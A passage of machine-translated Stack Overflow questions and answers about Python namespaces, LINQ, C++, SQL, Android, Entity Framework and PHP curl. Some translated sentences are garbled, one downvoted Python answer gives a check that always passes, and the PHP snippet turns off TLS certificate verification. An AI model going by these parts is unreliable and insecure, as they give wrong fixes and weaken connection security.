        Gl.glNormal3d(_normalSign * normal.GetX(), _normalSign * normal.GetY(), _normalSign * normal.GetZ());
        Gl.glVertex3d(v1.GetX(), v1.GetY(), v1.GetZ());
    } 
```

# python - python 命名空间：__main__.Class 不是 package.Class 的实例

> ID：15159854
> 
> 赞同：7
> 
> 时间：2013-03-01T14:17:06.800
> 
> 标签：python, namespaces

假设您有两个如下定义的 python 文件。假设一个是通用包（`class2`），另一个是特定的覆盖并用作可执行文件（`class1`）。

类1.py：

```
#!/usr/bin/python
class Test(object):
    pass

class Verificator():
    def check(self, myObject):
        if not isinstance( myObject, Test ):
            print "%s is no instance of %s" % (type(myObject),Test)
        else:
            print "OK!"

if __name__ == '__main__':
    from class2 import getTest

    v = Verificator()
    t = Test()
    v.check(t)
    s = getTest()
    v.check(s) 
```

类2.py：

```
from class1 import Test
def getTest():
    return Test() 
```

发生的情况是第一次检查正常，而第二次检查失败。原因是`t`while `__main__.Test`is`s`和`class1.Test`检查`v.check()`，`__main__.Test`但归根结底它是同一类，对吗？

有没有办法编写`v.check()`它也接受`class1.Test`对象，或者任何其他方法来解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T14:49:14.677

如果您打算`class1.py`从其他地方导入，请将顶级代码 (`if __name__ == '__main__': ...`完全移动到一个单独的文件中。这样主文件和`class2`同一个`class1.Test`类一起工作。

做几乎任何其他事情都会打开一罐蠕虫。`isinstance`虽然您可以通过切换到 来解决眼前的问题`type(myObject).__name__ == ...`，但事实仍然是您的 Python 进程包含两个`Test`类，而这些类应该只有一个。否则无法区分的类彼此一无所知，并且无法通过彼此的`issubclass`测试。这实际上保证了难以诊断的错误。

**编辑**
另一个选择是在`class1`作为主要执行时显式导入类，如您的答案中所示。建议更进一步，确保类不是以双精度定义的。例如，您可以将`if __name__ == '__main__'`块移动到文件的*开头*，并使用以下命令结束`sys.exit(0)`：

```
if __name__ == '__main__':
    import class1, class2
    ... use only the public API with module prefixes ...
    sys.exit(0)

# the rest of the module follows here 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T16:57:42.410

感谢您的提示，这最终帮助我朝着正确的方向进行实验。我刚刚在这个玩具模型中找到的解决方案是使用导入来修复命名空间问题。为了排除 user4815162342 指出的问题，我在 class1 中添加了另一个类。class1.py 的以下代码似乎可以执行我想要的操作：

```
#!/usr/bin/python
class Test(object):
    pass

class Toast(object):
    pass

class Verificator():
    def check(self, myObject):
        if not isinstance( myObject, Test ):
            print "NOPE: %s is no instance of %s" % (type(myObject),Test)
        else:
            print "OK: %s is instance of %s" % (type(myObject),Test)

if __name__ == '__main__':
    from class2 import getTest
    from class1 import Test, Toast

    v = Verificator()
    t = Test()
    v.check(t)
    t = getTest()
    v.check(t)
    t = Toast()
    v.check(t) 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-03-01T14:31:28.667

您可以使用该`type()`函数（实际上，您会发现此调用相当普遍！）：

```
#!/usr/bin/python
class Test(object):
    pass

class Verificator():
    def check(self, myObject):
        if not isinstance( type(myObject), type(Test) ):
            print "%s is no instance of %s" % (type(myObject),Test)
        else:
            print "OK!"

if __name__ == '__main__':
    from class2 import getTest

    v = Verificator()
    t = Test()
    v.check(t)
    s = getTest()
    v.check(s) 
```

可能更糟糕的解决方案：

```
if not isinstance( myObject.__class__, Test.__class__ ):  # Use __class__ here. 
```

它们当然是等价的，但是除非您非常需要，否则需要使用双下划线成员被认为是一种不好的形式！不过，值得知道它们的存在，因此我将这个包含在我的答案中。

请注意，据我所知，这种情况会发生，因为当您运行时`python class1.py`， class1.py 将没有模块。因此，python 会为您将所有内容放入`__main__`模块中。当您从任何其他脚本导入它时，情况*并非*如此，因此将某些内容视为`__main__`模块的一部分实际上是特例！

# asp.net - 例外：参数必须是服务器上的 FieldInfo 或 PropertyInfo

> ID：15159858
> 
> 赞同：0
> 
> 时间：2013-03-01T14:17:11.967
> 
> 标签：asp.net, .net, vb.net, linq-to-sql, windows-server-2008

环境：

*   开发 PC：Windows 7 x64 全新安装、Visual Studio 2012 和 IIS 7.5
*   部署服务器：Windows 2008 w/ sp2、iis 7、.Net 4.0（不确定是 32 位还是 64 位）
*   语言：VB
*   代码库：最初是经典的 ASP，在 ASP.NET 中使用

幕后故事：

我正在重写我们的 Intranet 管理站点的一部分。我在 App_Code 的目录下有一堆代码（20 多个文件），定义了 2 个命名空间。我在站点的子文件夹中也有一个 aspx 页面，它使用 App_Code 中的代码。我正在运行一个 Linq 查询，该查询从 SqlServer 中提取一些数据以显示在页面上。

问题：

将代码部署到服务器时，linq-to-sql 查询错误

```
Stack Trace:
    [ArgumentException: Argument must be either a FieldInfo or PropertyInfo]
    System.Linq.Expressions.Expression.ValidateSettableFieldOrPropertyMember(MemberInfo member, Type& memberType) +2751766
    System.Linq.Expressions.Expression.Bind(MemberInfo member, Expression expression) +48
    {my aspx file class}.{defined function} in {my aspx.vb file}
    {my aspx file class}.pageLoad() in {my aspx.vb file}
    {my aspx file class}._Lambda$__1(Object a0, EventArgs a1) in C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\06df741c\5a279add\App_Web_{my aspx file name}.aspx.2589a445.y_7knnxz.0.vb:0
    System.Web.UI.Control.OnLoad(EventArgs e) +91
    System.Web.UI.Control.LoadRecursive() +74
    System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +2207 
```

linq 查询在我的本地机器的 IIS 服务器和 Visual Studio 2012 的开发服务器上运行良好；只是不在公共网络服务器上。

其他 .net aspx 页面上的其他 linq 查询确实有效，并且以这种方式使用了许多功能。我曾尝试删除命名空间、添加行继续字符等...... 我已经尽可能多地搜索以找到答案，我能找到的只是引发错误的代码文件。

我目前正在尝试在 vm 中克隆环境（运行服务器 2008 的评估副本）并在其中托管站点。

任何可以提供的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T16:41:46.780

当我在执行我的操作时，服务器上的环境使用 linq 查询处理公共变量与公共属性的方式似乎存在问题

```
Select New MyClass With { .var1 = result.variable } 
```

我将属性修饰符添加到我的变量中：

```
Class MyClass
    Public Property var1
End Class 
```

代替

```
Class MyClass
    Public var1
End Class 
```

# c++ - 使用中间结果初始化多个属性

> ID：15159860
> 
> 赞同：1
> 
> 时间：2013-03-01T14:17:17.950
> 
> 标签：c++, constructor, initialization

我有一个类，其构造函数大致执行以下操作：

```
class B;
class C;
class D;  

class A{
private:
  B b;
  C c;

public:
  A(istream& input){
    D d(input) // Build a D based on input
    b = B(d);  // Use that D to build b
    c = C(d);  // and c
  }
} 
```

只要具有默认构造函数`B`，它就应该可以正常工作。`C`

我的问题是`B`没有，所以我需要`b`在初始化列表中进行初始化。但这是一个问题，因为我需要先构建`d`，然后才能计算`b`和`c`.

一种方法是：

```
A(istream& input):b(D(input)),c(D(input)){} 
```

但是建造一个`D`（非常）昂贵的（*）

**解决这个问题的干净方法是什么？**

* * *

(*) 另一个问题是如果`b`并且`c`需要从同一个实例构建（例如 if`D`的构造函数是随机的或其他）。但这不是我的情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:21:30.577

在 C++11 中，您可以使用[*委托构造函数*](http://www.drdobbs.com/delegating-constructors/184401647)：

```
class B;
class C;
class D;

class A
{
private:

    B b;
    C c;

public:

    explicit A(istream& input)
        :
        A(D(input))
    {
    }

    // If you wish, you could make this protected or private
    explicit A(D const& d)
        :
        b(d),
        c(d)
    {
    }
}; 
```

# sql - 在 ELSE CASE SQL 查询上使用 Convert

> ID：15159868
> 
> 赞同：2
> 
> 时间：2013-03-01T14:17:32.557
> 
> 标签：sql, postgresql, case, case-when, sql-convert

我在 Postgres 中执行 SQL 查询，它选择一个数字字段。我需要显示一个字符串值作为这个 SELECT 的结果，所以我使用这样的`CASE`语句：

```
Select 
case numeric_field
when 100 then 'some string'
when 200 then 'some other string' 
```

问题是如果数字字段有任何其他值（`300`例如），我需要显示这个值（当然作为字符串）。我试着`CONVERT`像这样在 else 上放一个

```
...
else CONVERT(varchar(10),numeric_field) 
```

但它没有用。我该怎么做呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:21:15.180

```
SELECT CASE numeric_field
          WHEN 100 THEN 'some string'
          WHEN 200 THEN 'some other string'
          ELSE numeric_field::text
       END AS result 
```

*   你的陈述不完整，`END`丢失了。[在此处阅读手册。](http://www.postgresql.org/docs/current/interactive/functions-conditional.html#FUNCTIONS-CASE)
*   要将数字字段输出为文本，只需将其转换为 text: `numeric_field::text`，这是 SQL 标准调用的 Postgres 特定的缩写形式：

    ```
    cast (numeric_field AS text) 
    ```

# android - How to create a Color Picker in android to apply color to a view

> ID：15159884
> 
> 赞同：-2
> 
> 时间：2013-03-01T14:18:41.363
> 
> 标签：android

Is there any way to create color picker in android like in photoshop

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-04-09T06:19:36.290

看看这个 github 项目。这是一个美丽的项目。

[https://github.com/QuadFlask/colorpicker](https://github.com/QuadFlask/colorpicker)

如何添加依赖？

该库未在 Maven Central 中发布，但您可以使用 JitPack

在 allprojects.repositories 中添加远程 maven url

```
allprojects {
    repositories {
        maven { url "https://jitpack.io" }
    }
} 
```

然后添加一个库依赖

```
dependencies {
    compile 'com.github.QuadFlask:colorpicker:0.0.13'
} 
```

或者，您可以手动下载 aar 并将其放入项目的 libs 目录中。

并添加依赖

```
dependencies {
    compile(name:'[arrFileName]', ext:'aar')
} 
```

在发布时查看最新版本

作为一个对话框

```
ColorPickerDialogBuilder
.with(context)
.setTitle("Choose color")
.initialColor(currentBackgroundColor)
.wheelType(ColorPickerView.WHEEL_TYPE.FLOWER)
.density(12)
.setOnColorSelectedListener(new OnColorSelectedListener() {
    @Override
    public void onColorSelected(int selectedColor) {
        toast("onColorSelected: 0x" + Integer.toHexString(selectedColor));
    }
})
.setPositiveButton("ok", new ColorPickerClickListener() {
    @Override
    public void onClick(DialogInterface dialog, int selectedColor, Integer[] allColors) {
        changeBackgroundColor(selectedColor);
    }
})
.setNegativeButton("cancel", new DialogInterface.OnClickListener() {
    @Override
    public void onClick(DialogInterface dialog, int which) {
    }
})
.build()
.show(); 
```

作为一个小部件

```
<com.flask.colorpicker.ColorPickerView
    android:id="@+id/color_picker_view"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    app:alphaSlider="true"
    app:density="12"
    app:lightnessSlider="true"
    app:wheelType="FLOWER"
    app:lightnessSliderView="@+id/v_lightness_slider"
    app:alphaSliderView="@+id/v_alpha_slider"
    />

<com.flask.colorpicker.slider.LightnessSlider
    android:id="@+id/v_lightness_slider"
    android:layout_width="match_parent"
    android:layout_height="48dp"
    />

<com.flask.colorpicker.slider.AlphaSlider
    android:id="@+id/v_alpha_slider"
    android:layout_width="match_parent"
    android:layout_height="48dp"
    /> 
```

# mysql - 为什么我可以创建名为“key”和“value”的表列，但以后不能使用它们？

> ID：15159886
> 
> 赞同：4
> 
> 时间：2013-03-01T14:18:43.390
> 
> 标签：mysql, sql, database, database-design

*每日提示：`backticks`像老板一样使用！甚至是你的笔迹！*

**更新：**如果您接受上述建议，则无需再阅读以下内容！严重地！

**问：** 我对此有点恼火。我可以创建一个包含名为`key`and的列的表`value`，但是当我想使用这些列时，我会看到一个非常好的语法错误，说明这些是`reserved keywords`用于 MySQL 的。

我的问题是：有人知道为什么会这样吗？为什么我一开始就没有收到语法错误？它有任何理由支持吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T14:19:38.613

只有`KEY`一个保留关键字`:D`。

*   [MySQL 保留关键字列表](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)

只需用反引号包装列名`KEY`，以便您可以使用它，例如

```
SELECT `key`
FROM   tableName 
```

或为表格提供别名，

```
SELECT a.key
FROM   tableName a 
```

# jquery - How to update locality when marker is dropped on google maps?

> ID：15159890
> 
> 赞同：0
> 
> 时间：2013-03-01T14:18:46.803
> 
> 标签：jquery, google-maps-api-3, google-maps-markers

I have a google maps application which is responsible get some information about a draggable marker. I would like to update the locality when this marker is moved.

So, I can update the latitude and longitude, but the locality I don't know how to do it. I'm using jquery-addresspicker and all methods that I'm using are [here](http://xilinus.com/jquery-addresspicker/src/jquery.ui.addresspicker.js). That's what I did:

```
Added a listener on markerMoved method
google.maps.event.addListener(this.gmarker, 'dragend', $.proxy(this._markerMoved, this));

_updatePosition: function(location) {
  if (this.lat) {
    this.lat.val(location.lat());
  }
  if (this.lng) {
    this.lng.val(location.lng());
  }
  if (this.locality) {
    this.locality.val(??????);
  }
},

_markerMoved: function() {
  this._updatePosition(this.gmarker.getPosition());
}
.
. 
```

Thanks in advance!

# oracle - 在 oracle 应用程序中编辑现有的键弹性域

> ID：15159891
> 
> 赞同：0
> 
> 时间：2013-03-01T14:18:46.803
> 
> 标签：oracle, oracle-apps

我所在的公司正在为其他组织实施 Oracle HCM。该组织已经在使用 Oracle Payroll 模块。他们希望 HCM 与现有工资单集成。该公司没有任何人专门研究任何 Oracle E-Business Suite 模块，因此即使我没有任何 Oracle 技术经验，我也被赋予了这项任务。我真正的问题如下：

在我拥有的业务需求和映射文档中，关键弹性域（特别是工作和职位弹性域）具有与工资单已经使用的不同结构和段。

我可以更改已经定义的关键弹性域吗？如果我这样做了，已经存在的工资单数据会发生什么，我是否能够创建新的工作，等等。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T01:19:32.857

一般来说，一旦定义了 Key Flexfield 结构，就不应更改它们。更改键弹性域结构可能会使交易中的基础数据无效，也可能使值集无效。但是，也有一些例外，但需要找到对受影响模块有深刻理解的人，找到批准的更新脚本，并进行广泛的测试。

[My Oracle Support](https://support.oracle.com)是一个很好的起点。搜索模块名称和“键弹性域”，看看你能找到什么。您还可以使用 Oracle 记录服务请求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-02-18T14:11:35.937

一种安全的方法是将段添加到已经存在的 keyflex 段中。只要组合保持唯一（因此：*key*），一切都应该没问题。

但是在工资单中可以有公式检查特定的工作/职位名称，所以这些需要修改。

或者已经完成工资单设置，以将百分比或金额与此类组织、工作、职位、......

# database - Kohana database config writter

> ID：15159906
> 
> 赞同：0
> 
> 时间：2013-03-01T14:19:37.267
> 
> 标签：database, kohana, config

I have no clue why but the database config writter doesn't seem to work.

I've already enabled the database module and attached the driver in boostrap.php:

```
Kohana::$config->attach(new Config_File);
Kohana::$config->attach(new Config_Database, FALSE); 
```

When i call the writter

```
Kohana::$config->write('group', 'key', 'value'); 
```

it just throws an ugly exception:

```
ErrorException [ Fatal Error ]: Call to undefined method Config::write() 
```

I've created the database table and **loading config works fine** when I manually insert data into the database.

note: I'm using kohana 3.2.2 with the built in database module.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:30:01.497

我猜抛出异常是因为`Config_File`，它是一个读者而不是一个作家（见[http://kohanaframework.org/3.2/guide/api/Config_File](http://kohanaframework.org/3.2/guide/api/Config_File)）。

尝试`Kohana::$config->attach(new Config_File);`在您的引导程序中删除。

# c# - 保存新记录实体框架时出现 C# 错误

> ID：15159913
> 
> 赞同：0
> 
> 时间：2013-03-01T14:20:06.207
> 
> 标签：c#, sql-server-2008, entity-framework

我在sql中有表

```
 USE [testDB]
 GO

 /****** Object:  Table [dbo].[MemberPanel]    Script Date: 03/01/2013 19:21:01 ******/
 SET ANSI_NULLS ON
 GO

 SET QUOTED_IDENTIFIER ON
 GO

 CREATE TABLE [dbo].[MemberPanel](
[UserId] [uniqueidentifier] NOT NULL,
[PanelId] [int] NOT NULL,
[Status] [int] NOT NULL,
  CONSTRAINT [PK_MemberPanel] PRIMARY KEY CLUSTERED 
 (
[UserId] ASC,
[PanelId] ASC
 )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
 ) ON [PRIMARY]

 GO

 ALTER TABLE [dbo].[MemberPanel]  WITH CHECK ADD  CONSTRAINT [FK_MemberPanel_Member]      FOREIGN KEY([UserId])
 REFERENCES [dbo].[Member] ([UserId])
 GO

 ALTER TABLE [dbo].[MemberPanel] CHECK CONSTRAINT [FK_MemberPanel_Member]
 GO

 ALTER TABLE [dbo].[MemberPanel]  WITH CHECK ADD  CONSTRAINT      [FK_PracticePanel_PracticePanel] FOREIGN KEY([PanelId])
 REFERENCES [dbo].[Panel] ([PanelId])
 GO

 ALTER TABLE [dbo].[MemberPanel] CHECK CONSTRAINT [FK_PracticePanel_PracticePanel]
 GO 
```

我使用实体框架并使用 c# 代码作为

```
 public static bool AddMemberPanels(List<int> panelIDs, Guid userId, int status)
    {
        try
        {
            using (FairShareEntities fairShareEntities = new FairShareEntities())
            {
                foreach (var panelID in panelIDs)
                {
                    var panel = new MemberPanel() { UserId = userId, PanelId = panelID,      Status = status };
                    fairShareEntities.AddToMemberPanel(panel);
                    fairShareEntities.SaveChanges();
                }

                return true;
            }
        }
        catch (Exception)
        {
            return false;
        }

    } 
```

保存时通过错误更改它

```
 {"Entities in 'TestEntities.MemberPanel' participate in the                'FK_MemberPanel_Member' relationship. 0 related 'Member' were found. 1 'Member' is expected."} 
```

请在这里帮助我，我不知道为什么它不允许我添加新记录，我还检查了所有值，即 UserID 和 PanelId，是的，它们作为 PK 存在于表中。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:32:45.703

不知道这是否是确切的问题，但在 EF 中您通常不应该设置外键 ID。相反，您应该从数据库中提取 User 和 Panel 实体并将新 MemberPanel 实体的导航属性设置为它们......

```
var newMemberPanel = ... // as you have already
newMemberPanel.Panel = existingPanel;
newMemberPanel.User = existingUser; 
```

我认为这可能会更好。

此外，您最好使用上下文中的方法创建新实体，而不是单独创建它然后将其添加到上下文中。我发现这有时是一种更稳定的方法。你应该能够做这样的事情......

```
 var newMemberPanel = ctx.MemberPanels.Add(); 
```

...然后像我上面展示的那样继续。

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:27:43.837

那是外键错误。这是一个 SQL 错误，而不是实体框架错误。

在添加“MemberPanel”之前，您需要添加“Member”对象。

您的数据库 shema 指定以下内容：

```
 ADD CONSTRAINT [FK_MemberPanel_Member] FOREIGN KEY([UserId]) 
    REFERENCES [dbo].[Member] ([UserId]) 
```

所以指定的 UserId 需要在表 Member

然后使用您的实体而不是 ID

```
var myLovedUser = fairShareEntities.Members.Where(x=>x.UserId = userID);
var incrediblePanel =  fairShareEntities.Panels.Where(x=>x.PanelId = panelId);
var memberPanel = new MemberPanel() {User = myLovedUser, Panel=incrediblePanel, Status= status };
fairShareEntities.AddToMemberPanel(panel);
fairShareEntities.SaveChanges(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T15:19:51.800

感谢大家，我已经解决了这个问题：

```
 public static bool AddMemberPanels(List<int> panelIDs, Guid memberId, int status)
    {
        try
        {
            using (FairShareEntities fairShareEntities = new FairShareEntities())
            {
                foreach (var panelId in panelIDs)
                {
                    //get the member and panels
                    Member theMember =
                        (from m in fairShareEntities.Member.Include("MemberPanel") where m.UserId == memberId select m).FirstOrDefault();

                    //see if this Member is already on this Panel
                    if (!(from mp in theMember.MemberPanel where mp.PanelId == panelId select mp).Any())
                    {

                        //get the panel
                        Panel thePanel = (from p in fairShareEntities.Panel where p.PanelId == panelId select p).FirstOrDefault();

                        //add the panel to this Member
                        MemberPanel addMemberPanel = new MemberPanel()
                        {
                            UserId = memberId,
                            Status = status,
                            Panel = thePanel,
                            PanelId = panelId
                        };
                        theMember.MemberPanel.Add(addMemberPanel);
                        fairShareEntities.SaveChanges();
                    }
                }

                return true;
            }
        }
        catch (Exception)
        {
            return false;
        }

    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-11-03T17:23:06.873

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace frmSales
{
    public partial class Form1 : Form
    {
        //create object for models
        tblSales modelSales = new tblSales();
        tblSalesLines modelSalesLine = new tblSalesLines();
        View_1 modelView = new View_1();

        public Form1()
        {
            InitializeComponent();
            LoadCmbBox();
        }

        //Fill dropdown
        private void LoadCmbBox()
        {
            using (DBEntities db = new DBEntities ())
            {
                var name = from tblProduct in db.tblProduct
                           select tblProduct;

                comboBox1.DataSource = name.ToList();
                comboBox1.DisplayMember = "barcode";
            }
        }

        //txtCName accepts only alphabetical characters
        private void txtCName_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsLetter(e.KeyChar) && !(e.KeyChar == 8) && !(e.KeyChar == 32))
            {
                e.Handled = true;
                MessageBox.Show("This textbox accepts only alphabetical characters", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //txtPhone accepts only Numbers
        private void txtPhone_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!(e.KeyChar >= '0' && e.KeyChar <= '9' || e.KeyChar == 8))
            {
                e.Handled = true;
                MessageBox.Show("This textbox accepts only Numbers", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //txtDec accepts only alphabetical characters
        private void txtDec_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsLetter(e.KeyChar) && !(e.KeyChar == 8) && !(e.KeyChar == 32))
            {
                e.Handled = true;
                MessageBox.Show("This textbox accepts only alphabetical characters", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //txtQtc accepts only Numbers
        private void txtQtc_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!(e.KeyChar >= '0' && e.KeyChar <= '9' || e.KeyChar == 8))
            {
                e.Handled = true;
                MessageBox.Show("This textbox accepts only Numbers", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //txtUPrice accepts only Numbers
        private void txtUPrice_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!(e.KeyChar >= '0' && e.KeyChar <= '9' || e.KeyChar == 8))
            {
                e.Handled = true;
                MessageBox.Show("This textbox accepts only Numbers", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            //AddButton();

            if (txtCName.Text == "")
            {
                MessageBox.Show("Please Enter Customer Name", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtAddress.Text == "")
            {
                MessageBox.Show("Please Enter Address", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtPhone.Text == "")
            {enter code here
                MessageBox.Show("Please Enter Telephone Number", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtDec.Text == "")
            {
                MessageBox.Show("Please Enter Description", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtQtc.Text == "")
            {
                MessageBox.Show("Please Enter Quantity", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtUPrice.Text == "")
            {
                MessageBox.Show("Please Enter Unit Price", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                AddButton();
                txtDec.Text = txtQtc.Text = txtUPrice.Text = txtTotal.Text = "";
            }
        }

        int rCount = 0;
        decimal amount = 0;
        private void AddButton()
        {
            if (txtDec.Text == "")
            {
                MessageBox.Show("Please Enter Description", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtQtc.Text == "")
            {
                MessageBox.Show("Please Enter Quantity", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (txtUPrice.Text == "")
            {
                MessageBox.Show("Please Enter Unit Price", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                dataGridView1.Rows.Add();

                rCount++;
                dataGridView1.Rows[dataGridView1.Rows.Count - 1].Cells[0].Value = rCount;
                dataGridView1.Rows[dataGridView1.Rows.Count - 1].Cells[1].Value = txtDec.Text;
                dataGridView1.Rows[dataGridView1.Rows.Count - 1].Cells[2].Value = txtQtc.Text;
                dataGridView1.Rows[dataGridView1.Rows.Count - 1].Cells[3].Value = txtUPrice.Text;
                dataGridView1.Rows[dataGridView1.Rows.Count - 1].Cells[4].Value = txtTotal.Text;

                amount = amount + Convert.ToDecimal(txtTotal.Text);
                txtAmount.Text = Convert.ToString(amount);
            }

        }

        private void txtUPrice_TextChanged(object sender, EventArgs e)
        {
            txtTotal.Text = "";
            if (txtUPrice.Text != "" && txtQtc.Text != "")
            {
                double Total = Convert.ToInt32(txtQtc.Text) * Convert.ToDouble(txtUPrice.Text);
                txtTotal.Text = Convert.ToString(Total);
            }

        }

        private void txtQtc_TextChanged(object sender, EventArgs e)
        {
            txtTotal.Text = "";
            if (txtUPrice.Text != "" && txtQtc.Text != "")
            {
                double Total = Convert.ToInt32(txtQtc.Text) * Convert.ToDouble(txtUPrice.Text);
                txtTotal.Text = Convert.ToString(Total);
            }
        }
        int invoiceNum = 1910020001;
        int invoiceCount = 0001;
        private void btnSave_Click(object sender, EventArgs e)
        {

            if (cmbSalesType.Text == "")
            {
                MessageBox.Show("Please Enter Sales Type", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                invoiceCount++;

                modelSales.InvNo = invoiceNum + invoiceCount;
                modelSales.SalesDate = DateTime.Now;
                modelSales.Amount = Convert.ToInt32(txtAmount.Text);
                modelSales.CustomerName = txtCName.Text;
                modelSales.Address = txtAddress.Text;
                modelSales.Tel = Convert.ToInt32(txtPhone.Text);
                modelSales.SalesType = cmbSalesType.Text;

                using (DBEntities db = new DBEntities())
                {
                    db.tblSales.Add(modelSales);
                    db.SaveChanges();

                    var select = (from tblSales in db.tblSales
                                  select tblSales.SalesID).Max();

                    modelSalesLine.SalesID = Convert.ToInt32(select);

                    for (int rows = 0; rows < dataGridView1.Rows.Count; rows++)
                    {
                        int col = 1;

                        modelSalesLine.ProductName = dataGridView1.Rows[rows].Cells[col++].Value.ToString();
                        modelSalesLine.Quantity = Convert.ToInt32(dataGridView1.Rows[rows].Cells[col++].Value.ToString());
                        modelSalesLine.UnitPrice = Convert.ToInt32(dataGridView1.Rows[rows].Cells[col++].Value.ToString());
                        modelSalesLine.Total = Convert.ToInt32(dataGridView1.Rows[rows].Cells[col++].Value.ToString());

                        db.tblSalesLines.Add(modelSalesLine);
                        db.SaveChanges();

                        MessageBox.Show("data saved successfully", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }

                }
            }
        }

        private void btnViewInvoice_Click(object sender, EventArgs e)
        {
            using (DBEntities db = new DBEntities())
            {
                DSsales ds = new DSsales();

                //Fil DT Sales
                var select = (from tblSales in db.tblSales
                              select tblSales.SalesID).Max();
                int maxId = Convert.ToInt32(select);

                var result = from tblSalesLines in db.tblSalesLines
                             where tblSalesLines.SalesID == maxId
                             select tblSalesLines;

                foreach (var item in result)
                {
                    var sales = ds.DT_SalesLine.NewDT_SalesLineRow();

                    sales[0] = item.SalesLineID;
                    sales[1] = item.SalesID;
                    sales[2] = item.ProductName;
                    sales[3] = item.Quantity;
                    sales[4] = item.UnitPrice;
                    sales[5] = item.Total;

                    ds.DT_SalesLine.AddDT_SalesLineRow(sales);
                }

                //Fil DT SalesLine
                var result1 = from tblSales in db.tblSales
                              where tblSales.SalesID == maxId
                              select tblSales;

                foreach (var item in result1)
                {
                    var sales = ds.DT_Sales1.NewDT_Sales1Row();

                    sales[0] = item.SalesID;
                    sales[1] = item.InvNo;
                    sales[2] = item.SalesDate;
                    sales[3] = item.Amount;
                    sales[4] = item.CustomerName;
                    sales[5] = item.Address;
                    sales[5] = item.Tel;
                    sales[5] = item.SalesType;

                    ds.DT_Sales1.AddDT_Sales1Row(sales);
                }
                CRSalesReport rpt = new CRSalesReport();
                rpt.SetDataSource(ds);

                frmCRsales frmCRsales = new frmCRsales();
                frmCRsales.crystalReportViewer1.ReportSource = rpt;

                frmCRsales.ShowDialog();
                frmCRsales.Dispose();
            }
        }

        private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            if (dataGridView1.CurrentCell.ColumnIndex.Equals(5) && e.RowIndex != -1)
            {
                dataGridView1.Rows.Remove(dataGridView1.Rows[e.RowIndex]);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.Text = "-- Select Barcode --";
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            using (DBEntities db = new DBEntities ())
            {
                try
                {
                    string barcode = comboBox1.Text;
                    var result2 = db.tblProduct.Where(x => x.barcode == barcode).FirstOrDefault();
                    txtDec.Text = result2.productName;
                }
                catch (Exception)
                {

                }

            }

        }
    }
} 
```

# php - json_decode 在我使用 CURL 获取 JSON 数据后返回一个空对象

> ID：15159915
> 
> 赞同：3
> 
> 时间：2013-03-01T14:20:10.107
> 
> 标签：php, json, curl

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$output = curl_exec($ch);
var_dump($output);
$json_array = json_decode($output, true);

var_dump(curl_error($ch));

curl_close($ch);

var_dump($json_array); 
```

$output 的 VARDUMP

